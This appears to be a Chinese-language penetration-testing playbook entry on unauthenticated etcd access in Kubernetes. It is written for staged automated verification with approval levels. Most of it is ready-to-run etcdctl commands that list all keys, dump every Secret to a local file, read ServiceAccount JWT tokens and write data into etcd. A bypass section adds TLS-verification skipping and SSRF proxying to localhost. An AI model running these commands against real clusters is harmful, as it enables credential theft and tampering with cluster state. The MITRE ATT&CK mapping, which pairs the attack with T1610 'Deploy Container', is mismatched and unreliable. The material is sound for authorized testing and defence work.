---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-2.8]
mapped_compliance_families: [etcd安全, TLS配置]
---

# etcd-unauth-access — etcd 未授权访问

etcd 2379 端口未配置客户端证书认证（`--client-cert-auth=false`）或监听非 localhost 且无 TLS 时，攻击者可直接读写整个集群的 KV 存储，读取全部 Secret、ConfigMap 等敏感数据。

---

## 1. 前置条件

- etcd 2379 端口对外开放（且监听地址含网卡 IP，非 127.0.0.1）
- `--client-cert-auth=false` 未启用客户端证书认证
- 或 etcd 未启用 TLS（`--listen-client-urls` 为 http://）
- etcdctl 工具或 curl 可用于无认证连接

检查命令：
```bash
# [L0] 宿主机观察：检查 etcd 启动参数中的 client-cert-auth
ps aux | grep etcd | grep -oE '\-\-client-cert-auth=\S+'
# 期望输出: --client-cert-auth=false（或参数缺失默认 false）

# [L0] 宿主机观察：检查 etcd 监听端口
ss -tlnp | grep 2379
# 期望输出: LISTEN ... <网卡IP>:2379 ... etcd（非仅 127.0.0.1）
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认 etcd 客户端 URL 配置
ps aux | grep etcd | grep -oE '\-\-listen-client-urls=\S+'
# 期望输出: --listen-client-urls=http://0.0.0.0:2379 或 https://0.0.0.0:2379

# [L1] 远程探测：验证无认证访问 etcd 全部 Key
etcdctl --endpoints=http://<node-ip>:2379 get / --prefix --keys-only 2>&1 | head -30
# 期望输出: 列出 /registry/ 下的全部 Key（含 /registry/secrets/、/registry/pods/）

# [L1] 远程探测：验证可列出所有 Secret Key（不读取 Value）
etcdctl --endpoints=http://<node-ip>:2379 get /registry/secrets/ --prefix --keys-only 2>&1 | head -20
# 期望输出: /registry/secrets/default/<secret-name> 等 Secret Key 列表

# [L1] 远程探测：检查 etcd 是否启用 TLS
openssl s_client -connect <node-ip>:2379 < /dev/null 2>&1 | head -5
# 期望输出: 若无 TLS，输出 "Connection reset" 或 "no peer certificate available"
```

## 3. 攻击验证

```bash
# [L1] 攻击验证：读取指定 Secret 的 Value
etcdctl --endpoints=http://<node-ip>:2379 get /registry/secrets/default/<secret-name>
# 期望输出: Secret 的完整 protobuf 编码内容（含 data 字段的密钥明文）

# [L1] 攻击验证：转储全部 Secret（保存到本地）
etcdctl --endpoints=http://<node-ip>:2379 get /registry/secrets/ --prefix > /tmp/etcd-secrets-dump.txt
# 期望输出: 无报错

wc -l /tmp/etcd-secrets-dump.txt
# 期望输出: 非零行数（含多条 Secret）

# [L2] 攻击验证：读取 ServiceAccount Token Secret
etcdctl --endpoints=http://<node-ip>:2379 get /registry/secrets/kube-system/default-token-<suffix> 2>&1 | strings | head -20
# 期望输出: 含 eyJ... 开头的 JWT Token（可冒充该 SA 操作 API Servers）

# [L2] 攻击验证：写入伪造数据到 etcd（测试写权限）
etcdctl --endpoints=http://<node-ip>:2379 put /tmp/etcd-poc-marker "escape-confirmed"
# 期望输出: OK

# [L2] 宿主机端确认：读取写入的 Key
etcdctl --endpoints=http://<node-ip>:2379 get /tmp/etcd-poc-marker
# 期望输出: /tmp/etcd-poc-marker → escape-confirmed

# [L2] 清理
etcdctl --endpoints=http://<node-ip>:2379 del /tmp/etcd-poc-marker
# 期望输出: 1（删除 1 条）
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：检查 etcd 中 /tmp/ 下无写入侵迹
etcdctl --endpoints=http://<node-ip>:2379 get /tmp/etcd-poc-marker 2>&1
# 期望输出: 无输出（Key 不存在）

# [L0] 攻击后环境对比：写入的 Key 存在
etcdctl --endpoints=http://<node-ip>:2379 get /tmp/etcd-poc-marker
# 期望输出: /tmp/etcd-poc-marker → escape-confirmed

# [L1] 攻击前：认证严格环境的 etcd 访问
etcdctl --endpoints=https://<secure-node-ip>:2379 get / --prefix --keys-only 2>&1
# 期望输出: rpc error: context deadline exceeded 或 tcp: i/o timeout x509 证书验证失败

# [L1] 攻击后：无认证环境的 etcd 访问
etcdctl --endpoints=http://<node-ip>:2379 get / --prefix --keys-only | head -5
# 期望输出: /registry/apiregistration.k8s.io/apiservices/...（成功列出 Key）

# [L2] 攻击前：无 Token 时无法使用 kubectl 读取 Secret
kubectl get secret -A 2>&1
# 期望输出: Forbidden 或证书错误

# [L2] 攻击后：通过 etcd 直接读取 Secret 内容
etcdctl --endpoints=http://<node-ip>:2379 get /registry/secrets/default/<secret-name> | strings | grep -A5 data
# 期望输出: Secret data 明文 → 证明 etcd 未授权访问绕过了 API Server 认证
```

差分结论：攻击前认证严格环境拒绝连接，攻击后未认证直连 etcd 成功读取全部 Secret 并写入数据，证明 etcd 未授权访问成功且可绕过 API Server 全部认证/授权。

## 5. 绕过策略

```bash
# [L1] 检查 etcd 是否要求 TLS 但无需客户端证书
openssl s_client -connect <node-ip>:2379 < /dev/null 2>&1 | grep -i 'no client certificate'
# 若 TLS 启用但 --client-cert-auth=false → 用 etcdctl --insecure-skip-tls-verify 绕过

# [L0] 检查网络策略是否限制 etcd 端口
kubectl get networkpolicy -A 2>/dev/null
# 若无限制 2379 的策略 → 集群内 Pod 可访问 etcd

# 绕过方式：
# - [L1] 若 etcd 启用 TLS 但 --client-cert-auth=false，使用 --insecure-skip-tls-verify 绕过证书验证
# - [L1] 若 etcd 监听 127.0.0.1 但节点存在 SSRF/代持漏洞，通过该漏洞代理到 localhost:2379
# - [L2] 若 protobuf 编码不可读，用 etcdctl --command-timeout=30s script 控制 / 或使用 etcd-dump 工具解码
# - [L1] 若 2379 被 NetworkPolicy 限制但 2380（peer）开放，利用 peer 端口无认证读取数据（需 etcd member 配置特定）
```

## 6. 证伪条件

```bash
# [L0] --client-cert-auth=true
ps aux | grep etcd | grep -oE '\-\-client-cert-auth=\S+'
# 输出: --client-cert-auth=true → 证伪

# [L1] 连接 etcd 被拒绝（证书验证失败）
etcdctl --endpoints=https://<node-ip>:2379 get / --prefix --keys-only 2>&1
# 输出: x509: certificate signed by unknown authority / context deadline exceeded → 证伪

# [L0] 2379 端口仅监听 127.0.0.1
ss -tlnp | grep 2379
# 输出: 127.0.0.1:2379 → 证伪（远程不可达）

# [L1] 匿名 GET 命令被拒
etcdctl --endpoints=http://<node-ip>:2379 get / --prefix --keys-only 2>&1
# 输出: Error: ... permission denied / etcdserver: request timed out → 证伪

# [L1] 端口不开放
nc -zv <node-ip> 2379 2>&1
# 输出: Connection refused → 证伪
```

## 7. 审批级别

- **L2** 攻击验证（读取 Secret、写入数据到 etcd）→ **Level 4**（访问集群敏感存储，需人工确认）
- **L1** 远程探测（etcdctl get --keys-only）→ **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察（ps、ss）→ **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Credential Access / Exfiltration Over Unencrypted Non-C2 Protocol
- **Technique ID**: T1610
- **Technique Name**: Deploy Container（广义：利用容器基础设施存储组件窃取数据）
- **描述**: 攻击者绕过 API Server 认证，直连未授权的 etcd 数据库，读取全部 Secret、ConfigMap 等集群敏感数据，并可篡改集群状态，本质是绕过 K8s 控制面认证的横向数据访问。